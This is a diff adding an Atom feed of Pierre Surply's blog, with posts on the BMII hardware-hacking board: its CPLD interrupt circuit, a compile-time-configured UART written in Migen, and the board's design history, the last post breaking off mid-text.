@@ -1,0 +1,4275 @@
+<?xml version='1.0' encoding='UTF-8'?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+  <id>urn:uuid:927647f6-67da-5fe0-ab95-c028fa5ed338</id>
+  <title>Pierre Surply's Blog</title>
+  <updated>2017-01-02T17:38:11.642316+00:00</updated>
+  <author>
+    <name>Pierre Surply</name>
+    <email>surply@lse.epita.fr</email>
+  </author>
+  <link href="http://blog.psurply.com" rel="alternate"/>
+  <generator version="0.4.0">python-feedgen</generator>
+  <entry>
+    <id>urn:uuid:d67f7634-68d4-596a-b96f-879b7c438baf</id>
+    <title>Engendering An Interrupt Circuit On BMII</title>
+    <updated>2016-12-29T00:00:00+01:00</updated>
+    <author>
+      <name>Pierre Surply</name>
+      <email>surply@lse.epita.fr</email>
+    </author>
+    <content type="text">While the former 'control registers'-based IOModule model defined in BMII was
+mostly suitable to represent a wide variety of interfaces between a host and
+its controlled devices, it became quite embarrassing when dealing with modules
+that had to be controlled asynchronously.
+
+Event-based communication had to be implemented by polling a STATUS register
+which contained flags representing the availability of a data or a unit.
+Although quite common in 'real-life' applications, this kind of mechanism is
+most of the time coupled with an interrupt system.
+
+This principle allowed the controller to perform another task while waiting
+for events coming from one of its devices.
+
+An implementation of such mechanism has been tested in BMII[1].
+Due to its nature, many aspects of it have been tweaked to fit the existing
+design choices and its technical limitations.
+
+# API changes
+
+In order to allow the definition of the interrupt circuit, the existing API
+has been extended. It now integrates objects used to generate the RTL of the
+interrupt circuit as well as functions to define how the host is supposed to
+handle events coming from the CPLD.
+
+## Declaring the interrupt line
+
+The following example demonstrates a basic IOModule which generates interrupt
+requests for each edge of its input signal.
+
+    class IntPushButtonIOModule(IOModule):
+        def __init__(self):
+            IOModule.__init__(self, "int_push_button")
+
+            # Declares input signal
+            self.iosignals += IOSignal("IN", IOSignalDir.IN)
+
+            # Defines pulse signals from input
+            pressed = Signal()
+            released = Signal()
+
+            # Converts the level-signal into a single-tick pulse
+            self.submodules.pressed = LevelToPulse(~self.iosignals.IN, pressed)
+            self.submodules.released = NLevelToPulse(~self.iosignals.IN, released)
+
+            # Declares interrupt signals
+            self.intrs += IntRequest("PRESSED", pressed)
+            self.intrs += IntRequest("RELEASED", released)
+
+
+## Connecting the interrupt line to the interrupt circuitry
+
+Once the interrupt lines have been declared, it is necessary to define how they
+are connected to the top-level design. In the same manner that 'iosignals' are
+connected to the 'southbridge', the 'northbridge' has been designed to be
+responsible for multiplexing the interrupt lines:
+
+    ipb = IntPushButton()
+    bmii.add_module(ipb)
+
+    # Connects input to switch in southbridge
+    bmii.ioctl.sb.pins.SW += ipb.iomodule.iosignals.IN
+
+    # Connects interrupt lines to interrupt circuit in northbridge
+    bmii.ioctl.nb.interrupts += ipb.iomodule.intrs.PRESSED
+    bmii.ioctl.nb.interrupts += ipb.iomodule.intrs.RELEASED
+
+On this model, the first interrupt line appended in the northbridge has the
+highest priority while the latest has the lower one.
+The priority level can also be manually set by using the `connect` method:
+
+    # Highest priority
+    bmii.ioctl.nb.interrupts.connect(0, ipb.iomodule.intrs.PRESSED)
+
+    # Lowest priority
+    bmii.ioctl.nb.interrupts.connect(1, ipb.iomodule.intrs.RELEASED)
+
+## Interrupt Handler
+
+On the host side, the definition of event callbacks is performed by the
+'interrupt_handler' decorator that takes the identifier of the interrupt as
+parameter. Callbacks take pointers to the BMIIModule and the BMII top-level
+object for arguments.
+
+    @interrupt_handler("PRESSED")
+    def handle_pressed(self, bmii):
+        logging.info("Push button pressed")
+
+    @interrupt_handler("RELEASED")
+    def handle_released(self, bmii):
+        logging.info("Push button released")
+
+Due to some technical limitations described in the next sections, these
+events cannot be completely asynchronous. The polling of pending interrupts
+has to be performed from the host using the following top-level method:
+
+    bmii.handle_interrupts()
+
+The command line has also been extended with the 'run' command that waits and
+handle interrupts from a particular module:
+
+    $ bmii -v -m intr run
+    [INFO] Push button pressed
+    [INFO] Push button released
+
+# Under The Hood
+
+## The Interrupt Request Signal
+
+For each interrupt request defined in an IOModule, a circuit has to be
+generated to ensure the 'local' logic needed to correctly drive the request
+line. Its role is mainly to transform a trigger signal to a reliable request
+information. For that, two methods are commonly used.
+
+### Edge triggered
+
+The first one consists in asserting the interrupt request signal as soon as a
+front-edge is detected on the trigger signal. From the RTL perspective, this
+means introducing another clock domain driven by the trigger signal (more or
+less conditioned by some combinatory logic). An example of such circuit could
+be:
+
+     eoi      pending  trigger  ack         intr
+      |           |        |     |           |
+      |           |        |     |           |
+      |           |        |     |           |
+      | +-----+   |        |     | +-----+   |
+      +-|R   Q|---+        |     +-|R   Q|---+
+        |     |            |       |     |
+      +-|S  /Q|--------&amp;---+     +-|S    |
+      | +-----+        |         | +-----+
+      |                |         |
+      +----------------+---------+
+
+
+- intr
+    Asserting this signal alerts the interrupt circuit that the IOModule is
+    requesting an interruption.
+- trigger
+    The front-edge of this signal triggers the interrupt request.
+- ack
+    Driven by the interrupt circuit, this signal indicates that the request
+    has been received and is going to be handled. When asserted, the `intr` is
+    cleared in order to avoid a second engagement from this request.
+- pending
+    Indicates that the interrupt request is still pending and is not yet
+    completed.
+- eoi (End-Of-Interrupt)
+    Asserting this signal terminates the interrupt cycle, allowing a potential
+    next request to be started. It is driven by the interrupt circuit when all
+    handlers associated to this request have been completely executed.
+
+Even though the edge triggered interrupt are preferred for firing events from
+short-width pulses, the logic implied here stays highly prone to spurious
+interrupts and the desynchronization from the system clock could lead to
+undefined behavior if not interfaced correctly with the rest of the design.
+
+### Level triggered
+
+Another strategy to manage the interrupt pin tickling is to sample the trigger
+signal synchronously to the system clock. This method forbids the detection
+of a pulse signal which its width is smaller than the system clock's period.
+The roles of the previously defined signals remain but are now latched
+synchronously with the system clock:
+
+    self.sync += \
+            If(intr.ack,
+                intr.eq(0)).\
+            Elif(intr.eoi,
+                intr.pending.eq(0)).\
+            Elif(~intr.pending &amp; intr.trigger,
+                intr.eq(1),
+                intr.pending.eq(1))
+
+Due to its reliability, this design has been preferred in this project.
+
+## The Northbridge Evolves
+
+The multiplexing of the IRQ signals to the unique interrupt pin of the USB
+controller is managed by the northbridge. This unit was already responsible for
+bridging the GPIF signals with the IO controller's internal bus.
+
+### Firing the IRQ
+
+The '#int0' output connected to the USB controller is basically an OR-reduced
+version of the interrupt requests coming from the IO modules.
+When an interrupt request is pending, the data bus of the GPIF is used to drive
+the number of the interrupt line instead of ensuring its primary purpose.
+
+        Northbridge                      USB Controller
+
+            +----+                 |
+    intr1 -&gt;|    |                 |
+    intr2 -&gt;| or |-------------+------ #int0
+    intr3 -&gt;|    |             |   |
+            +----+             |   |
+                               |   |
+            +----------+       |   |
+    intr1 -&gt;| Priority |     |\|   |
+    intr2 -&gt;|          |----&gt;| \   |
+    intr3 -&gt;| Encoder  |     |  |  |
+            +----------+     |  |----- fd[0:7]
+                             |  |  |
+          usual circuit ----&gt;| /   |
+                             |/    |
+
+
+### Acknowledgement
+
+As the GPIF is now completely recycled in case of interrupt request, the
+expected behavior from the USB controller is to read the interrupt number by
+performing a 'GPIF single read'. The reading operation is expected to be
+coupled with the assertion of the CTL2, an additional pin managed by the GPIF
+and usually used to ensure this kind of control operation.
+
+The assertion of this 'acknowledgment' signal is the intended mechanism to
+indicate to the interrupt circuit that the USB controller has considered the
+request and is asking for the clearing of the `intr` signal of the highest
+priority interrupt.
+
+
+            +----------+
+    intr1 -&gt;| Priority |       +---+    +---+    |
+      ... -&gt;|          |------&gt;| = |---&gt;| &amp; |&lt;----- CTL2
+        +--&gt;| Encoder  |       +---+    +---+    |
+        |   +----------+         ^        |
+        |                  intr  |        | ack
+        |                 number |        v
+        |                      +---------------+
+        +----------------------|  IRQ circuit  |
+                          intr +---------------+
+
+### End-Of-Interrupt
+
+Even though the acknowledgement ends the signalling of the request to the USB
+controller, it doesn't mean that the interrupt request has been completely
+handled. In order to avoid additional triggering of an event that is currently
+processed by another component, the local interrupt circuit is locked (using
+the 'pending' signal) until the host explicitly terminates it.
+
+To implement this mechanism, a new control register has been added to the
+northbridge: EOI. To trigger the end-of-interrupt signal of a particular
+interrupt line, the host has to write the corresponding interrupt number in
+this register.
+
+    bmii.northridge.drv.EOI = IRQ_number
+
+The termination of the request is performed as soon as the writing operation
+is completed, allowing the event to be re-triggered again.
+
+                                 +-------------+
+                            +----| IRQ circuit |
+                       intr |    +-------------+
+                     number |        ^
+                            |        | eoi
+         CtrlRegs           v        |
+          +-----+ value   +---+    +---+
+    IBus--| EOI |--------&gt;| = |---&gt;| &amp; |
+          +-----+         +---+    +---+
+             |                       ^
+             |                       |
+             +-----------------------+
+                 wr_pulse
+
+## The USB Controller's Unused Pin
+
+The two interrupt pins of the FX2LP had been connected to the CPLD but
+were never used before the implementation of this capability.
+
+After enabling and unmasking the interrupt from the FX2LP's firmware, the
+handling of the INT0 interrupt is achieved as follow:
+
+    void int0_isr(void) __interrupt IE0_ISR
+    {
+        BYTE dummy;
+
+        gpif_enable();                          /* Re-enable GPIF */
+        wait_gpif_done();                       /* Wait until GPIF ready */
+        dummy = XGPIFSGLDATLX;                  /* Trigger reading of single
+                                                   word through GPIF
+                                                   by performing a dummy read
+                                                   on XGPIFSGLDATLX register */
+
+        wait_gpif_done();                       /* Wait until the end of
+                                                   reading operation */
+        event_queue_enqueue(XGPIFSGLDATLNOX);   /* Enqueue the read value
+                                                   without starting a new
+                                                   transmission */
+
+        IE0 = 0;                                /* Clear interrupt flag */
+    }
+
+As the CPLD is now expected to drive the data bus with the interrupt number,
+the FX2LP just has to read it though the GPIF and to store it in a
+dedicated data structure.
+
+### Event Queue
+
+Once the interrupt number has been retrieved, it is pushed on a queue located
+in the USB controller's memory. These event notifications are then waiting to
+be dequeued by the host through a vendor-specific USB request.
+
+As the event numbers are pushed by the interrupt handler, the queuing and
+dequeuing operations are asynchronous: some precautions have to be taken when
+manipulating this structure. A naive implementation of those operations
+necessitates the usage of a lock to ensure the integrity of the data stored.
+
+From a low-level perspective, such mechanism requires an atomic
+`Test-And-Set` instruction or equivalent. On a 8051, the architecture of the
+USB controller's core, the only similar instruction proposed is `jbc`.
+This one jumps to a specified address if a bit located in the core memory is set
+and clears it afterwards. Although limited in space, the core memory is
+bit-addressable as opposed to XDATA memory.
+
+There is no explicit way to use this instruction in SDCC[2]. Instead, it
+atomically detects the following pattern to generate the `jbc` instruction:
+
+    static volatile __bit mutex;
+
+    // Acquire mutex
+    for (;;) {
+        if (mutex) {
+            mutex = 0;
+            break;
+        }
+    }
+
+This spinlock definition generates this code:
+
+    _event_queue_lock:
+    00104$:
+        jbc     _mutex,00114$   ;; Jump if direct bit = 1, then clear the bit
+        sjmp    00104$          ;; Unconditional short jump
+    00114$:
+
+A possible deadlock here would be reached in case of interrupt storm. An
+uncontrolled interrupt line could lead to an unresponsive USB controller, which
+could brick the board since this chip also acts as a JTAG programmer for the
+CPLD.
+
+A countermeasure for that is simply to disable the interrupt line once the
+event queue is full and to leave it masked until an event is dequeue from the host:
+
+    if (ep.size &gt;= EVENT_QUEUE_SIZE)
+        EX0 = 0;                        /* Disable INT0 */
+
+
+### Querying events
+
+As explained previously, the events enqueued have to be queried by the host.
+To allow that, a new vendor command has been added to the USB interface:
+
+    0xF3 - GET_EVENT
+
+It requests the number of next pending event and can be initiated by using a
+control transfer:
+
+    dev.ctrl_transfer(
+            bmRequestType=bmRequestType.VENDOR_READ,
+            bRequest=bRequest.GET_EVENT,
+            wValue=0,
+            wIndex=0,
+            data_or_wLength=1)  # Request 1 byte from device
+
+In the USB controller side, the code is as trivial as:
+
+    case GET_EVENT:
+        /* Enqueue the next event in EP0BUF */
+        EP0BUF[0] = event_queue_dequeue();
+
+        /* Send 1 byte through EP0BUF */
+        EP0BCH = 0;
+        EP0BCL = 1;
+
+This method is clearly the bottleneck of all the fancy mechanisms explained in
+this post as the host is forced to synchronously poll the FX2LP. Such situation
+is caused by the limitation of the USB2 protocol. Maybe another USB
+configuration could provide better response time to events, let's find out
+another time...
+
+# Links
+
+[1]: https://github.com/psurply/bmii/commit/97f22d4a84287dbb25c76145dbce44cea4fa8ae1
+[2]: http://sdcc.sourceforge.net/
+
+-- 
+Pierre Surply
+</content>
+    <link href="http://blog.psurply.com/0007-engendering_an_interrupt_circuitry_on_bmii.txt" rel="alternate"/>
+    <published>2016-12-29T00:00:00+01:00</published>
+  </entry>
+  <entry>
+    <id>urn:uuid:efd04e39-8d8d-54e1-b852-246ebcb49d5b</id>
+    <title>When the Asynchronous Receiver/Transmitter cannot be Universal</title>
+    <updated>2016-11-12T00:00:00+01:00</updated>
+    <author>
+      <name>Pierre Surply</name>
+      <email>surply@lse.epita.fr</email>
+    </author>
+    <content type="text">Due to its ease of use and its unrestrictive electrical requirements,
+asynchronous serial communications at TTL levels stay nowadays the preferred
+way to make 'character'-based devices talk each other.
+
+Transmitting serialized data can be achieved in many ways according to the
+speed and the format of data frames. This dilemma is often solved by fixedly
+configured devices that only allow a specific protocol and impose the other
+peripheral to be configured in the same way.
+
+Dealing with such stubborn devices is generally achieved by the use of
+an Universal Asynchronous Receiver/Transmitter. This hardware unit has the
+ability to be highly configurable from a controller and then can be made
+suitable for any kind of serial device.
+
+While working on the BMII project, an hardware hacking swiss-army knife board [1],
+the idea of integrating such unit was considered.
+A first implementation of an UART has been tested on an Altera Max V CPLD.
+Even though a simple serial line is quite lightweight in terms of logic-blocks,
+it becomes quite space-consuming when all the configuration circuit has to be
+embedded in the programmable device.
+
+According to the situation explained in the beginning, it would be quite
+restrictive to lose the ability to easily configure the serial line according
+to the remote device requirements. Although the used CPLD is limited by
+the number of logic blocks, it stays with the astonish capability to be
+reprogrammed: this post aims to expose the idea of configuring the UART module
+at `compile-time` in order to generate the most lightweight RTL for a fixed and
+known configuration.
+
+All the metaprogramming achieved here to generate the desired hardware design
+is based on Migen [2], a package allowing the definition of RTL design using
+python.
+
+# Simplified Block Diagram Of A Serial Transceiver
+
+An asynchronous transceiver is mainly characterized by the fact that clock
+signal used to shift bits must be calibrated with the exact same frequency in
+both devices. As this signal is not physically shared, each is responsible for
+generating it. The baudrate generator block is designed for this purpose and
+converts the input clock to the baudrate signal used to clock the transmit and
+receive units.
+
+                                                         IOSignals
+                                                      |
+                                       +-----------+  |
+                                       |           |  |
+                                  +---&gt;|  TX Unit  |------TX--&gt;
+           +-------------+        |    |           |  |
+           |  Baudrate   |        |    +-----------+  |
+    sys---&gt;|  Generator  |---com--+                   |
+    clk    |             |   clk  |    +-----------+  |
+           +-------------+        |    |           |  |
+                                  +---&gt;|  RX Unit  |&lt;-----RX---
+                                       |           |  |
+                                       +-----------+  |
+                                                      |
+
+Although being similar in their logic, the TX and the RX units are completely
+independent. For instance, the TX unit could be represented according to the
+following diagram:
+
+    CtrlRegs                                                     IOSignals
+              |  +------+      +----------------+    |\
+        THR ----&gt;| FIFO |-----&gt;| Shift Register |---&gt;| \
+              |  +-+--+-+      +-+--------------+    |  |
+              |    |  |          |                   |  |
+     STATUS &lt;------+  |          |      start bit---&gt;|  |      |
+              |       |          |                   |  |---------&gt; TX
+                      |          |       stop bit---&gt;|  |      |
+                      |          v                   |  |
+                      |      +------------------+    |  |
+                      |      | Parity Generator |---&gt;| /
+                      |      +------------------+    |/|
+                      |                                |
+                      |                             +-----+
+                      +----------------------------&gt;| FSM |
+                                                    +-----+
+
+If we forget the configuration part, the unit is typically controlled by a
+Transmission Hold Register (THR) used to store data that has to be sent and
+a Status Register (STATUS) reflecting the state of the transmission queue.
+The serialization is then ensured by a simple shift register.
+
+# Adjusting The Time Reference
+
+The first property of an asynchronous serial protocol is its shifting speed.
+While every UART embeds a dynamic configuration of this speed, the goal here is
+to configure it at compile-time by templating the code of a fixed
+baudrate generator.
+
+As the used CPLD does not provide any configurable PLL, a trivial
+implementation of the baudrate that we are forced to use consists of
+controlling the period of a free-running counter incremented by the system clock.
+
+    class BaudRateGenerator(Module):
+        def __init__(self, input_freq, baudrate):
+            self.clock_domains.cd_clk = ClockDomain()
+            self.output = Signal()
+            self.comb += self.cd_clk.clk.eq(self.output)
+
+            max_value = int(input_freq / (2 * baudrate) - 1)
+            cnt = Signal(math.ceil(math.log2(max_value)))
+
+            self.sync += \
+                    If(cnt &gt;= max_value,
+                        self.output.eq(~self.output),
+                        cnt.eq(0)).\
+                    Else(cnt.eq(cnt + 1))
+
+
+The baudrate generator takes as parameters the frequency of the system clock and
+the desired frequency for the output clock. The job of the Migen's module is
+basically to create a new clock domain that will be driven by the period of the
+free-running counter. The value of this period is computed as soon as the
+module is instantiated and the circuit will be generated from that.
+
+        # Baudrate Generator
+        sys_clk_freq = 48000000
+        self.submodules.brg = BaudRateGenerator(sys_clk_freq, baudrate)
+
+# Patterns And Divergences
+
+A typical frame format of an asynchronous serial transmission can be modelled
+as follow:
+
+             IDLE -&gt; START -&gt; DATA -&gt; PARITY -&gt; STOP -&gt; IDLE
+    Cycles           1        x       0-1       1-2
+
+IDLE:   The carrier is in a stable state and does not transmit any data.
+START:  Mandatory in an asynchronous communication, the start symbol denotes a
+        change in the IDLE signal and warn the paired device that a frame is
+        starting. This stage typically consists of a unique symbol.
+DATA:   The line carries data. The duration of this stage is purely arbitrary.
+PARITY: The parity bit acts as a cheap 'checksum' and represents the parity of
+        the number of '1' symbols in the DATA field. The symbol is optional.
+STOP:   A symbol indicating the end of the frame. The length of this symbol
+        may change according to the configuration.
+
+This behaviour can be easily represented by an high-level finite state-machine.
+The following code generate this FSM and is parametrized by `data_width`,
+`parity_bit` and `stop_bits`:
+
+    fsm = FSM()
+    fsm.act("IDLE",
+            *self.idle(),
+            If(self.start_condition(),
+                *self.enter_start(),
+                NextValue(cnt, 1),
+                NextState("DATA" if skip_start else "START")).\
+            Else(NextState("IDLE")))
+
+    fsm.act("START",
+            *self.start(),
+            NextState("DATA"))
+
+    fsm.act("DATA",
+            *self.shift_data(),
+            NextValue(cnt, cnt + 1),
+            If(cnt &gt;= data_width,
+                NextValue(cnt, 1),
+                *(self.enter_stop() if not parity_bit else []),
+                NextState("PARITY" if parity_bit else "STOP")).\
+            Else(NextState("DATA")))
+
+    fsm.act("PARITY",
+            *self.parity(),
+            NextState("STOP"))
+
+    fsm.act("STOP",
+            *self.stop(),
+            NextValue(cnt, cnt + 1),
+            If(cnt &gt;= stop_bits,
+                NextState("IDLE")).\
+            Else(NextState("STOP")))
+
+This model defines a template of the frame format generator and is completed by
+the concrete definition of the TX and RX units.
+
+The state-machine has to be clocked from the baudrate generator signal: this
+can be configured by using the Migen's ClockDomainsRenamer Module decorator.
+It will adapt the synchronous logic of this module to use the "brg_clk" clock
+domain instead of the system clock:
+
+    self.submodules += ClockDomainsRenamer("brg_clk")(fsm)
+
+## The Simplest Form Of Error Checking
+
+Even though the existence of the parity bit is defined by the previous state
+machine, the computation can also be configured by the polarity of the parity
+bit.
+
+    class ParityType(Enum):
+        Even    = 1
+        Odd     = 2
+
+    class ParityGenerator(Module):
+        def __init__(self, parity_type):
+            self.input = Signal()
+            self.parity = Signal()
+            self.en = Signal()
+
+            # Compute the parity if enabled
+            even = Signal()
+            self.sync += \
+                If(~self.en,
+                    even.eq(0)).\
+                Elif(self.input,
+                    even.eq(~even))
+
+            # Define polarity of the parity
+            if parity_type == ParityType.Odd:
+                self.comb += self.parity.eq(~even)
+            else:
+                self.comb += self.parity.eq(even)
+
+In the same manner as for the FSM, this unit must operate in the BRG clock
+domain:
+
+        self.pg = ParityGenerator(parity_bit)
+        self.submodules += ClockDomainsRenamer("brg_clk")(self.pg)
+
+The parity generator block is used to drive the parity bit in the TX unit
+while its purpose is to check the validity of received frame on the RX unit.
+
+TX:
+
+    def parity(self):
+        return [
+            self.tx.eq(self.pg.parity)
+        ]
+
+
+RX:
+    def parity(self):
+        return [
+            If(self.pg.parity == self.data,
+                NextValue(self.fifo.we, 1))
+        ]
+
+
+## Strengthen The Accuracy
+
+One small improvement that could be added in the RX unit compared to the TX
+unit is the `triple sampling`.
+
+The method consists of increasing the sampling rate and to store the three
+last captured samples. The input data actually used to base the reception logic
+will be the average value of these three samples.
+It is a quite common mechanism when dealing with the capture of asynchronous
+serial data.
+
+As this mechanism requires extra logic, making it optional is, in our case,
+the right way to go:
+
+    if triple_sampling:
+        # Instanciate a new baudrate generator running 4 times faster than the
+        # communication baudrate
+        self.submodules.sampler = BaudRateGenerator(48000000, baudrate * 4)
+
+        # Shift register containing the three last samples
+        samples = Signal(3)
+        self.sync.rx_clk += samples.eq((samples &lt;&lt; 1) | self.rx)
+
+        # Getting the average value
+        self.comb += self.data.eq(
+                (samples[0] &amp; samples[1]) |
+                (samples[0] &amp; samples[2]) |
+                (samples[1] &amp; samples[2]))
+    else:
+        # Only sample during BRG clock's front edge if triple sampling
+        # is disabled
+        self.comb += self.data.eq(self.rx)
+
+# TL;DR
+
+As a result, the following example demonstrates the use of the previously
+defined model to generate the smallest UART design which matches the
+configuration defined when instantiated:
+
+    # Create a BMII design
+    bmii = BMII()
+
+    # Generate the UART design
+    uart = UART(baudrate=115200, data_width=8, parity_bit=None, stop_bits=1)
+
+    # Add the UART to the BMII design
+    bmii.add_module(uart)
+
+    # Connect IOSignals to actual pins
+    bmii.ioctl.sb.pins.IO10 += uart.iomodule.iosignals.TX
+    bmii.ioctl.sb.pins.IO11 += uart.iomodule.iosignals.RX
+
+The generated module can then be used as a regular BMII module and has been
+tested here with an FTDI TTL-232R-3V3 cable:
+
+    bmii.usbctl.drv.set_cpu_speed(CPUSpd.CLK_48M)   # Set system clock frequency
+    uart.transmit("Hello World!")                   # Transmit characters
+    --
+    $ stty -F /dev/ttyUSB0 115200 -parity -cstopb
+    $ cat /dev/ttyUSB0
+    Hello World!
+
+The changeset is accessible in the main BMII repo [3].
+
+# Links
+
+[1]: https://blog.lse.epita.fr/articles/81-bmii-odtdta.html
+[2]: https://github.com/m-labs/migen
+[3]: https://github.com/psurply/bmii/commit/d9dc313895093bdf135dbac4986d06ef57cca311
+
+-- 
+Pierre Surply
+</content>
+    <link href="http://blog.psurply.com/0006-when_async_rxtx_cannot_be_universal.txt" rel="alternate"/>
+    <published>2016-11-12T00:00:00+01:00</published>
+  </entry>
+  <entry>
+    <id>urn:uuid:a40f6e94-c713-5703-aeab-8a2e33415a90</id>
+    <title>One Device to drive them all</title>
+    <updated>2016-10-24T00:00:00+02:00</updated>
+    <author>
+      <name>Pierre Surply</name>
+      <email>surply@lse.epita.fr</email>
+    </author>
+    <content type="text">![](/medias/images/bmii/main3.jpg)
+
+## Prologue
+
+&gt; Three Devices for logic analysis of passively captured traces,&lt;br/&gt;
+&gt; Seven for inter-chip communication driven by hardwired interfaces,&lt;br/&gt;
+&gt; Nine for in-circuit debugging limited to specific purpose,&lt;br/&gt;
+&gt; One for complex hardware hacking scenarios.
+
+Three tinkerers took those words as they are. Overthrown by the complexity
+implied by the multiplicity of inefficient tools, they thought that time had
+come to undertake this problem from another angle.
+
+All they needed was a simple way to manipulate the exotic devices that they
+required for their projects.
+Manufactured by foreign organizations, devices referred here were designed to
+fulfill a predefined purpose and were intended to be used as black boxes.
+Without any knowledge of the internal mechanisms involved in their operations,
+it was conceivable to integrate them if they were in the kind of environment
+that they were promised to.
+
+But those tinkerers though differently. Their situation was mostly complicated
+by the fact that they had already acquired a good control of their personal
+computers that they considered as their main and perfect workstation. Well
+defined and roughly understood, they were too stubborn to learn another way
+to work as they unanimously decided that this method was the most effective and
+compliant with the rest of their work.
+
+So instead of reworking there methodology, they agreed that defining a third
+device whose only purpose was to handle the interfacing between the workstation
+and the device under test were inescapable. The first member of the group asked
+to others what options were available to fit this position.
+
+The second one said that he already made an intensive usage of the Arduino for
+that. Providing an easy access and control of its GPIO and some hardwired bus
+controllers, it was suitable for the most simple cases.
+
+The third one discussed the merits of the
+[Bus Pirate](http://dangerousprototypes.com/docs/Bus_Pirate) from Dangerous
+Prototype. Mature and widely-used, this tool provided a direct control of its
+interface via USB without the need to develop a specific firmware to be
+actually used.
+
+The first one replied to these proposals that they had a common issue: they
+simply performed the communication with the host by using an interface based on
+the translation of USB to UART speeded at 115200 bauds. For him, it prohibited
+a fine-grained configuration and then limited the full capacities provided by
+the USB protocol.
+
+They all agreed on this last point and started to work on a first prototype of
+their response to this situation.
+
+It was based on a
+[STM32F072](http://www.st.com/content/st_com/en/products/microcontrollers/stm32-32-bit-arm-cortex-mcus/stm32f0-series/stm32f0x2/stm32f072rb.html)
+microcontroller and mapped SPI, I2C, UART and CAN signals to physical headers.
+As this chip was able to drive USB signals, a USB mini-connector was directly
+connected to it.
+
+Concerning the software side, one interesting idea here was to expose the
+hardware interfaces using the corresponding subsystem in the Linux kernel. Even
+though these subsystems were mostly used to describe on-chip interfaces,
+adapting them to wrap up the USB functions was feasible. For instance, the SPI
+exposed by the device could be manipulated as a regular
+[spidev](https://www.kernel.org/doc/Documentation/spi/spidev).
+
+Although the concept of such board was appealing at the time, limitations
+quickly appeared. First of all, most of the USB protocol had to be implemented
+via software on the STM32F072 which led to a significant overhead on each USB
+transaction. Secondly, fully implementing the host driver in kernel space
+implied a rigid configuration and error-prone if not implemented correctly.
+Finally, the global stability of the STM32F072 MCU was quite poor especially
+during a development phase where on-chip debugging had to be frequently used.
+
+[![](/medias/images/bmii/bm.jpg)](/medias/images/bmii/bm.jpg)
+
+One year passed and no one was actually enthusiastic to use this dead-born
+project in a real context. The first one, whose credibility was at its lower
+point, got the bravery to propose to the two others to rethink the project
+from the beginning. And they accepted, against all odds.
+
+This write-up must be considered as the collection of thoughts
+that led them to the design and the manufacture of a second version of this
+small, unpretentious, and unfinished electronic board.
+
+## Chapter I: Forging the One Device
+
+The first step for them was to clearly define how and what could make the
+second version of the board better than the previous one. The main issue was
+related to the lack of flexibility of the design and they wondered how
+they could handle a protocol not supported by the microcontroller they used.
+
+Then they decided to take a look at the wide range of *Programmable Logic
+Devices* available nowadays. As a first prototype, a CPLD appeared to be the
+best choice for such application. Compared to a regular FPGA, these
+non-volatile PLD were cheaper and required a much more simpler configuration
+circuit. They also thought that the prototype was designed to only prove a
+concept and moving to a more powerful FPGA for next versions was conceivable.
+
+### Section I: From Ink...
+
+From a high-level point of view, the board had been specified to expose a
+reasonable number of IOs directly connected to a controller, here an
+[Altera Max V CPLD](https://www.altera.com/products/cpld/max-series/max-v/overview.html).
+As the flaky soft USB implementation of the previous version was
+quite inconvenient to maintain and to keep reliable, the job here had been
+assigned to a well-known and solid dedicated USB controller: the
+[FX2LP](http://www.cypress.com/products/ez-usb-fx2lp) from
+Cypress Semiconductor. This highly integrated USB 2.0 microcontroller
+implemented most of the protocol logic in silicon and only burdened its integrated
+8051's firmware with the high-level configuration aspect of USB.
+
+[![](/medias/images/bmii/bmii_final.svg)](/medias/images/bmii/bmii_final.svg)
+
+And then came the question about the communication between the USB controller
+and the IO controller. The FX2LP embedded a powerful mechanism to forward the
+content of a USB entrypoint to an hardware FIFO without any interaction with
+the internal 8051. These EP buffer's words could then be dequeued by an external
+component using an hardware interface.
+
+However, this one was defined by a 16-bit data bus and 6 control signals which
+was quite pin-consuming for the CPLD they chose. Fortunately, another
+mechanisms offered by the FX2LP allowed the programming of a custom protocol
+to transmit and receive these data with the external world: the *General Programmable
+Interface*. As for the regular FIFO interface, this hardware unit was almost
+completely independent from the 8051. The firmware was only responsible to
+program the hardware state-machines used to represent the waveforms of a
+one-word transmission.
+
+In their case, they chose to allocate 8 wires for the bidirectional data bus,
+3 control signals driven by the USB controller and 2 'ready' signals
+initiated by the IO controller. At that point, none of them had actually thought
+about the exact shape of the waveforms and the purpose of the control signals
+but planned to consider that once the first board would be fully manufactured.
+
+The USB device interface was composed of 3 endpoints. The endpoint 0 acted as a
+regular control endpoint and was used to transfer small requests. Meanwhile,
+endpoints 2 and 6 were dedicated to bulk transmissions and receptions
+respectively. The two last were directly connected to the internal FIFO while
+the first one was completely handled by the 8051.
+
+[![](/medias/images/bmii/usbctl.svg)](/medias/images/bmii/usbctl.svg)
+
+To power these components, the 5V supplied by the USB were firstly shifted to
+3.3V using a low-dropout voltage regulator to power the USB controller and the
+IO banks of the CPLD while a 1.8V regulator powered the CPLD's internal logic.
+
+The main clock was managed by the FX2LP. Connected to a 24MHz crystal, the
+internal PLL were configured by the 8051 firmware allowing a CPU clock
+frequency of 48MHz, 24MHz or 12MHz. As the output of the phase-locked loop was
+also exposed outside the USB controller by the CLKOUT pin, the CPLD used it as
+a system clock.
+
+The GPIF unit had a dedicated clock that could be fed internally or imposed by
+an external device. All operations on this interface were aligned to this
+signal. In order to avoid to deal with multiple clock domains in the CPLD, they
+arranged to drive the IFCLK signal from the IO controller at the half frequency
+of the system clock.
+
+An I2C EEPROM had been connected to USB controller in order to store
+its firmware in a persistent way. The internal reset logic of the FX2LP was
+designed to scan the I2C bus for EEPROM from where a valid firmware could be
+loaded. Once the program was fully copied to internal RAM, no operations were
+performed on this bus.
+
+After several tries, they finally validated the following schematic:
+
+[![](/medias/images/bmii/sch/bmii_sch.svg)](/medias/images/bmii/sch/bmii_sch.svg)
+
+### Section II: ...To Copper
+
+Once the design approved, the next step consisted to draw the printed circuit
+board. Two layers were enough to route the entire netlist in a surface of
+5x5cm.
+
+The top layer was dedicated to voltage regulation, CPLD, connectors and
+a couple of switches and LEDs.
+Meanwhile, the bottom one contained the whole circuit required to
+make the USB controller working: crystal, EEPROM, I2C pull-up resistors, ...
+
+IOs from the CPLD were exposed via 2 dual-row 20-pin female headers of 2.54mm
+pitch.
+
+[![](/medias/images/bmii/pcb_main.png)](/medias/images/bmii/pcb_main.png)
+
+As the board was manually soldered, it was not conceivable for them to use BGA
+components for this prototype. So the 100-pin LQFP version of the CPLD had been
+used as well as the 56-pin SSOP package of the Cypress's chip.
+
